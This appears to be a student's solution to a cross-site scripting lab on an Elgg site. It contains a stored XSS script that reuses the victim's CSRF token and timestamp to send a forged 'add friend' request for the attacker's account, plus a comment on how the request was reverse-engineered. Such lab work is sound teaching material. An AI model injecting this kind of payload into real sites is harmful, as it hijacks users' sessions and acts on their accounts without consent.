<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl= "/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN
	
	var isSamy = elgg.session.user.guid;

	//Create and send Ajax request to add friend
	if(isSamy !== 47)
	{
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		//Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>

/* 
	I reached the solution by constructing the sendurl variable after inspecting how a normal add friend GET request looks like in the 		Network Tab of firefox. Then, after finding out the order of timestamp
	and token in the url, I constructed the sendurl accordingly.

	Also, after finding out that guid is stored in elgg.session.user variable, I used it in the if condition to check if the user is 		Samy(the attacker) 
*/ 


